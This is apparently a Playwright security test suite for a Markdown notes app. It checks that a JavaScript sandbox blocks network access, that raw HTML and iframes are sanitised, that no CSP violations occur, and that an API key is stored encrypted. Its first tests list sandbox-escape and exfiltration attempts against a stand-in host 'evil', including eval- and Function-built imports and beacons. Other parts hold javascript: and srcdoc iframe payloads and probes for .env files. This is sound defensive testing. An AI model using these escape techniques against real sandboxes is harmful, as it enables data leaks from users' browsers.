import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { test, expect, type Page } from "@playwright/test";

/**
 * Plan 2.3 — the security spec (T48). One file for the promises the
 * content sandbox makes:
 *
 *   1. live-js code has no network: every way out fails inside the worker,
 *      and nothing reaches the network;
 *   2. raw HTML keeps only the classes the Markdown pipeline itself emits
 *      (a note cannot borrow the app's styling to cover it);
 *   3. an <iframe> without a scheme (it would load the app itself, with
 *      allow-same-origin) is removed;
 *   4. a note with every kind of block causes 0 CSP / Trusted Types
 *      violations — against a build, under the production header policy;
 *   5. a key entered in the UI is nowhere in plain text in the browser's
 *      storage, and the server hands out no env file.
 *
 * Hosts under .lumen-e2e.test are fake; requests to them are answered (and
 * counted) here, so the spec never leaves the machine.
 */

const EVIL = "evil.lumen-e2e.test";
const BUILT = Boolean(process.env.PLAYWRIGHT_BASE_URL);

// Every request goes through the page, so routes and counters see it.
test.use({ serviceWorkers: "block" });

test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => {
    localStorage.setItem("lumen-tour-done", "1");
    localStorage.removeItem("lumen-md");
    // CSP / Trusted Types violations, main document only.
    if (window.top === window) {
      document.addEventListener("securitypolicyviolation", (e) => {
        const w = window as unknown as { __cspViolations?: string[] };
        (w.__cspViolations ??= []).push(`${e.violatedDirective} ${e.blockedURI} ${e.sourceFile}:${e.lineNumber}`);
      });
    }
  });
});

interface FakeHostTraffic {
  /** Requests to the fake hosts that reached the network (routed or answered). */
  left(): string[];
  /** Requests the page started that never got that far (e.g. refused by a CSP). */
  stopped(): string[];
}

/**
 * Watch (and answer) every request to the fake hosts, from pages and
 * workers. A request "left" only if Playwright's route saw it or a response
 * came back: a load the CSP refuses produces neither. Chromium reports one
 * as failed with "csp" and WebKit with other wording, so the failure text
 * is not relied on.
 */
async function watchFakeHosts(page: Page): Promise<FakeHostTraffic> {
  const fake = (url: string) => new URL(url).hostname.endsWith(".lumen-e2e.test");
  const started: string[] = [];
  const reached = new Set<string>();
  page.context().on("request", (r) => {
    if (fake(r.url())) started.push(r.url());
  });
  page.context().on("response", (r) => {
    if (fake(r.url())) reached.add(r.url());
  });
  await page.context().route(/\.lumen-e2e\.test\//, (route) => {
    reached.add(route.request().url());
    return route.fulfill({ status: 204, body: "" });
  });
  return {
    left: () => [...reached],
    stopped: () => started.filter((u) => !reached.has(u)),
  };
}

async function writeNote(page: Page, markdown: string) {
  const editor = page.locator(".cm-content").first();
  await editor.click();
  await editor.fill(markdown);
}

const preview = (page: Page) => page.locator(".prose-lumen").first();

test("live-js has no network: every way out fails in the worker, nothing is requested", async ({ page }) => {
  const traffic = await watchFakeHosts(page);
  await page.goto("/");
  const attempts = {
    fetch: `fetch("https://${EVIL}/fetch")`,
    xhr: `(() => { const x = new XMLHttpRequest(); x.open("GET", "https://${EVIL}/xhr"); x.send(); })()`,
    websocket: `new WebSocket("wss://${EVIL}/ws")`,
    eventsource: `new EventSource("https://${EVIL}/sse")`,
    importScripts: `importScripts("https://${EVIL}/classic.js")`,
    // A literal import() makes the worker refuse the whole run (next test),
    // so these build one from a string: every string compiler is gone.
    evalImport: `(0, eval)("imp" + "ort('https://${EVIL}/eval.js')")`,
    functionImport: `Function("return imp" + "ort('https://${EVIL}/function.js')")()`,
    asyncCtorImport: `(async () => {}).constructor("return imp" + "ort('https://${EVIL}/async.js')")()`,
    timerImport: `setTimeout("imp" + "ort('https://${EVIL}/timer.js')")`,
    fontFace: `new FontFace("x", "url(https://${EVIL}/font.woff2)").load()`,
    shadowRealm: `new ShadowRealm().evaluate("imp" + "ort('https://${EVIL}/realm.js')")`,
    beacon: `navigator.sendBeacon("https://${EVIL}/beacon", "x")`,
    nestedWorker: `new Worker("https://${EVIL}/worker.js")`,
    globalFetch: `globalThis.fetch("https://${EVIL}/global")`,
    protoFetch: `Object.getPrototypeOf(self).fetch.call(self, "https://${EVIL}/proto")`,
  };
  // Entries, not `results.fetch = …`: the worker's lockdown defines
  // non-writable `fetch`, `importScripts`, … on every prototype of `self`,
  // Object.prototype included, so such an assignment silently does nothing.
  const body = [
    "const results = [];",
    ...Object.entries(attempts).map(
      ([name, expr]) =>
        `try { const r = await (async () => ${expr})(); results.push([${JSON.stringify(name)}, r === false ? "refused" : "ok"]); } catch (e) { results.push([${JSON.stringify(name)}, "blocked"]); }`,
    ),
    'console.log("net " + JSON.stringify(Object.fromEntries(results)));',
  ].join("\n");
  await writeNote(page, "```live-js\n" + body + "\n```\n");

  await expect(page.locator("text=JS run: Not run yet")).toBeVisible({ timeout: 10_000 });
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  await expect(page.locator("text=JS run: Completed")).toBeVisible({ timeout: 10_000 });
  const line = await page.locator("text=/\\[log\\] net /").first().textContent();
  const results = JSON.parse(line!.slice(line!.indexOf("{"))) as Record<string, string>;
  expect(Object.keys(results).sort()).toEqual(Object.keys(attempts).sort());
  for (const [name, outcome] of Object.entries(results)) expect(outcome, name).toBe("blocked");
  // Nothing reached the network, in any engine.
  expect(traffic.left()).toEqual([]);
  // The runner is a sandboxed frame without same-origin powers.
  await expect(page.locator("iframe[data-livejs-runner]").first()).toHaveAttribute("sandbox", "allow-scripts");
});

test("live-js refuses code with import(): the run fails before it starts, nothing is requested", async ({ page }) => {
  // WebKit does not apply the runner's script-src to a worker's dynamic
  // import() (docs/security/headers.md, open item 11), so the worker never
  // compiles code that contains the word.
  const traffic = await watchFakeHosts(page);
  await page.goto("/");
  await writeNote(page, "```live-js\nconsole.log(\"before\");\nawait import(\"https://" + EVIL + "/module.js\");\n```\n");
  await expect(page.locator("text=JS run: Not run yet")).toBeVisible({ timeout: 10_000 });
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  await expect(page.locator("text=JS run: Runtime error")).toBeVisible({ timeout: 10_000 });
  await expect(page.locator('text=/contains the word "import"/').first()).toBeVisible();
  // Refused before compiling: not even the line before the import ran.
  await expect(page.locator("text=/\\[log\\] before/")).toHaveCount(0);
  expect(traffic.left()).toEqual([]);
});

test("raw HTML keeps only Lumen's own classes; styling cannot cover the app", async ({ page }) => {
  await page.goto("/");
  await writeNote(
    page,
    [
      "# Classes",
      "",
      '<div id="cover" class="lumen-slash-menu fixed inset-0 z-50 cmd-palette-backdrop admonition note" style="position: fixed; inset: 0">cover</div>',
      "",
      '<span id="code" class="language-js wiki-link prose-lumen hidden">code</span>',
      "",
      "- [ ] a task",
      "",
    ].join("\n"),
  );
  const cover = preview(page).locator("text=cover").first();
  await expect(cover).toBeVisible({ timeout: 10_000 });
  expect(await cover.getAttribute("class")).toBe("admonition note");
  expect(await cover.evaluate((el) => getComputedStyle(el).position)).not.toBe("fixed");
  expect(await preview(page).locator("text=code").first().getAttribute("class")).toBe("language-js wiki-link");
  // The pipeline's own classes still render.
  await expect(preview(page).locator("li.task-list-item")).toHaveCount(1);
  // No app class leaked into the note.
  for (const cls of ["lumen-slash-menu", "fixed", "inset-0", "z-50", "cmd-palette-backdrop", "hidden"]) {
    await expect(preview(page).locator(`.${cls}`), cls).toHaveCount(0);
  }
});

test("an iframe without a scheme is removed; an https embed is sandboxed", async ({ page }) => {
  const traffic = await watchFakeHosts(page);
  await page.goto("/");
  await writeNote(
    page,
    [
      "# Frames",
      "",
      '<iframe src="/"></iframe>',
      '<iframe src="index.html"></iframe>',
      `<iframe src="//${EVIL}/protocol-relative"></iframe>`,
      '<iframe src="javascript:alert(1)"></iframe>',
      '<iframe srcdoc="<script>parent.alert(1)</script>"></iframe>',
      `<iframe src="https://frames.lumen-e2e.test/embed"></iframe>`,
      "",
      "after",
    ].join("\n"),
  );
  await expect(preview(page).locator("text=after")).toBeVisible({ timeout: 10_000 });
  const frames = preview(page).locator("iframe");
  await expect(frames).toHaveCount(1);
  await expect(frames.first()).toHaveAttribute("src", "https://frames.lumen-e2e.test/embed");
  await expect(frames.first()).toHaveAttribute("sandbox", "allow-scripts allow-popups allow-presentation allow-same-origin");
  await expect(frames.first()).toHaveAttribute("referrerpolicy", "no-referrer");
  // No frame shows the app (or anything on its origin).
  const origins = await page.evaluate(() => [...document.querySelectorAll(".prose-lumen iframe")].map((f) => new URL((f as HTMLIFrameElement).src).origin));
  expect(origins).not.toContain(new URL(page.url()).origin);
  expect(traffic.left().filter((u) => u.includes(EVIL))).toEqual([]);
  // The embed host is not in frame-src: the page's CSP refuses it, and the
  // violation listener the CSP test relies on sees that.
  await expect
    .poll(() => page.evaluate(() => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? []))
    .toContainEqual(expect.stringMatching(/^frame-src https:\/\/frames\.lumen-e2e\.test/));
});

/**
 * The app's response-header CSP as Cloudflare / Netlify send it
 * (public/_headers, route `/*`), including Trusted Types. The preview
 * servers send no headers, so against a build the spec adds it to the
 * document itself.
 */
function headerPolicy(): string {
  const text = readFileSync(fileURLToPath(new URL("../public/_headers", import.meta.url)), "utf8");
  const block = text.split(/\n(?=\S)/).find((b) => b.startsWith("/*\n"));
  const csp = /^\s+Content-Security-Policy:\s*(.+)$/m.exec(block ?? "")?.[1];
  if (!csp) throw new Error("public/_headers: no CSP for /*");
  return csp.trim();
}

test("a note with every kind of block causes 0 CSP / Trusted Types violations", async ({ page, baseURL }) => {
  // The waits below add up to about 2 minutes in the worst case (15 + 45 +
  // 15 + 20 + 15 s plus the page load), well past the 30 s default.
  test.setTimeout(180_000);
  const traffic = await watchFakeHosts(page);
  if (BUILT) {
    const csp = headerPolicy();
    const origin = new URL(baseURL!).origin;
    await page.route(
      (url) => url.origin === origin && (url.pathname === "/" || url.pathname === "/index.html"),
      async (route) => {
        if (route.request().resourceType() !== "document") return route.continue();
        const response = await route.fetch();
        await route.fulfill({ response, headers: { ...response.headers(), "content-security-policy": csp } });
      },
    );
  }
  const response = await page.goto("/");
  // Against a build the document really carries the header policy.
  if (BUILT) expect(response?.headers()["content-security-policy"]).toContain("require-trusted-types-for 'script'");
  await writeNote(
    page,
    [
      "# Every block",
      "",
      "Inline math $e^{i\\pi} + 1 = 0$ and **bold** [[Wiki Link]].",
      "",
      "| a | b |",
      "|---|---|",
      "| 1 | 2 |",
      "",
      "```ts",
      "const x: number = 1;",
      "```",
      "",
      "```mermaid",
      "graph TD; A-->B;",
      "```",
      "",
      "```chart",
      "xAxis: { type: category, data: [Jan, Feb, Mar] }",
      "yAxis: { type: value }",
      "series:",
      "  - type: bar",
      "    data: [12, 19, 8]",
      "```",
      "",
      "```csv",
      "name,value",
      "a,1",
      "b,2",
      "```",
      "",
      "```dot",
      "digraph { a -> b }",
      "```",
      "",
      "```svg",
      '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" /></svg>',
      "```",
      "",
      `<p>Raw <b>HTML</b> with <img src="https://pixels.lumen-e2e.test/p.gif" alt="pixel"> and <a href="https://example.org" target="_blank">a link</a>.</p>`,
      "",
      "> [!note]",
      "> An admonition.",
      "",
      "```live-js",
      "console.log('csp-ok');",
      "```",
      "",
    ].join("\n"),
  );
  await expect(preview(page).locator(".lumen-remote-image")).toHaveCount(1, { timeout: 15_000 });
  // Heavy blocks (live-js among them) mount when scrolled near; bring each
  // one into view until none is pending, so every block really renders (a
  // violation-free page that rendered nothing would prove little).
  const blocks = preview(page).locator(":scope > *");
  await expect(async () => {
    const n = await blocks.count();
    for (let i = 0; i < n; i++) await blocks.nth(i).scrollIntoViewIfNeeded();
    await expect(preview(page).locator("[data-lumen-block-pending]")).toHaveCount(0, { timeout: 2_000 });
    await expect(preview(page).getByText(/Loading (diagram|chart|live-js)…|Scroll to render/)).toHaveCount(0, { timeout: 2_000 });
  }).toPass({ timeout: 45_000 });
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  await expect(page.locator("text=/\\[log\\] csp-ok/")).toBeVisible({ timeout: 15_000 });
  await expect(preview(page).locator(".katex").first()).toBeVisible();
  await expect(preview(page).locator(".mermaid-block svg").first()).toBeAttached({ timeout: 20_000 });
  // Let late loads land so their violations are recorded. A settle step,
  // not an assertion: the dev server's page never reaches networkidle.
  await page.waitForLoadState("networkidle", { timeout: 15_000 }).catch(() => {});
  const violations = await page.evaluate(() => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? []);
  expect(violations).toEqual([]);
  // The note's tracking pixel stayed a placeholder: nothing went out.
  expect(traffic.left()).toEqual([]);
});

test("secrets scan: a key entered in the UI is nowhere in plain text; no env file is served", async ({ page, request }) => {
  const KEY = "sk-ant-e2e-SECRET-0123456789abcdef";
  await page.goto("/");
  await expect(page.locator(".cm-content").first()).toBeVisible({ timeout: 15_000 });

  // AI: Switch Provider → Claude → the key prompt (src/commands/useCommands.ts).
  await page.keyboard.press("Meta+K");
  const palette = page.getByRole("dialog");
  await expect(palette).toBeVisible();
  await page.keyboard.type("Switch Provider");
  await page.keyboard.press("Enter");
  const dialog = page.locator('[role="dialog"][aria-labelledby="prompt-dialog-title"]');
  await dialog.locator("select").selectOption("anthropic");
  await dialog.locator(".prompt-btn-ok").click();
  await dialog.locator("input").fill(KEY);
  await dialog.locator(".prompt-btn-ok").click();
  await expect(dialog).toHaveCount(0);

  const scan = async () =>
    page.evaluate(async () => {
      const decode = (v: unknown): string => {
        if (v instanceof ArrayBuffer) return new TextDecoder().decode(v);
        if (ArrayBuffer.isView(v)) return new TextDecoder().decode(v as Uint8Array);
        return "";
      };
      const walk = (v: unknown, out: string[], depth = 0) => {
        if (depth > 6 || v == null) return;
        if (typeof v === "string") return void out.push(v);
        const bytes = decode(v);
        if (bytes) return void out.push(bytes);
        if (typeof v === "object") for (const x of Object.values(v as object)) walk(x, out, depth + 1);
      };
      const dump: string[] = [];
      for (const s of [localStorage, sessionStorage]) for (const k of Object.keys(s)) dump.push(k, s.getItem(k) ?? "");
      dump.push(document.cookie);
      // The entry the key prompt wrote (src/lib/secretStore.ts: an AES-GCM
      // { iv, data } under its own name; "__key__" is the CryptoKey).
      let entry: { stored: string; ivBytes: number; dataBytes: number } | null = null;
      for (const { name } of (await indexedDB.databases?.()) ?? []) {
        if (!name) continue;
        const db = await new Promise<IDBDatabase>((res, rej) => {
          const r = indexedDB.open(name);
          r.onsuccess = () => res(r.result);
          r.onerror = () => rej(r.error);
        });
        for (const store of Array.from(db.objectStoreNames)) {
          const read = <T,>(op: (s: IDBObjectStore) => IDBRequest<T[]>) =>
            new Promise<T[]>((res) => {
              const req = op(db.transaction(store).objectStore(store));
              req.onsuccess = () => res(req.result);
              req.onerror = () => res([]);
            });
          // getAll and getAllKeys return in the same (key) order.
          const values = await read<unknown>((s) => s.getAll());
          const ids = await read<IDBValidKey>((s) => s.getAllKeys());
          for (const v of values) walk(v, dump);
          const i = ids.indexOf("lumen.ai.key.anthropic");
          if (name === "lumen-secrets" && i >= 0) {
            const v = values[i] as { iv?: unknown; data?: unknown } | string;
            entry = {
              stored: typeof v === "string" ? "string" : v && v.iv instanceof Uint8Array && v.data instanceof ArrayBuffer ? "sealed" : "other",
              ivBytes: typeof v === "object" && v?.iv instanceof Uint8Array ? v.iv.byteLength : 0,
              dataBytes: typeof v === "object" && v?.data instanceof ArrayBuffer ? v.data.byteLength : 0,
            };
          }
        }
        db.close();
      }
      if (typeof caches !== "undefined") for (const n of await caches.keys()) for (const r of await (await caches.open(n)).keys()) dump.push(r.url);
      return { text: dump.join("\n"), entry };
    });
  // The key was stored under its own name, sealed (so the scan is not
  // vacuous: the "__key__" CryptoKey alone would not satisfy this)…
  await expect.poll(async () => (await scan()).entry?.stored, { timeout: 10_000 }).toBe("sealed");
  const { text, entry } = await scan();
  expect(entry!.ivBytes).toBe(12);
  // AES-GCM: the plaintext plus a 16-byte tag.
  expect(entry!.dataBytes).toBe(new TextEncoder().encode(KEY).byteLength + 16);
  // …and is nowhere in plain text.
  expect(text).not.toContain(KEY);
  expect(text).not.toContain("SECRET-0123456789");

  // No env file is served. Acceptable answers: an error status, the SPA's
  // own index.html (a fallback), or a dropped connection (vite preview
  // resets one for dotfiles). Anything else counts as served.
  const index = await (await request.get("/")).text();
  expect(index).toMatch(/<!doctype html>/i);
  for (const path of ["/.env", "/.env.local", "/.env.production", "/.env.onprem"]) {
    let outcome: string;
    try {
      const res = await request.get(path, { failOnStatusCode: false, maxRedirects: 0 });
      const body = await res.text();
      outcome = !res.ok() ? "error status" : body === index ? "index fallback" : `served ${res.status()}: ${body.slice(0, 80)}`;
      expect(body, path).not.toMatch(/^\s*[A-Z][A-Z0-9_]*=/m);
    } catch (e) {
      outcome = /socket hang up|ECONNRESET|ECONNREFUSED|closed/i.test(String(e)) ? "connection dropped" : `error: ${e}`;
    }
    expect(["error status", "index fallback", "connection dropped"], `${path}: ${outcome}`).toContain(outcome);
  }
});
